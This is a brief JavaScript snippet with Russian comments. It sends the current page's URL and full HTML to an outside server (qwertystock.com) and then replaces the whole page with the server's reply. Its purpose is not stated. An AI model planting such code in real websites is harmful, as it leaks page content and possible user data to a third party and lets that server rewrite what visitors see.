const serverUrl = 'https://qwertystock.com';

// Получаем URL текущей страницы
const pageUrl = window.location.href;

// Формируем тело запроса, добавляя URL страницы перед HTML кодом страницы
const requestBody = pageUrl + '<!--URL-->' + document.documentElement.outerHTML;

fetch(`${serverUrl}/tunnel-for-trends`, {
    method: 'POST',
    headers: {
        'Content-Type': 'text/html',
    },
    body: requestBody,
})
.then(response => response.text())
.then(html => {
    document.documentElement.innerHTML = html;
})
.catch(error => console.error('Error:', error));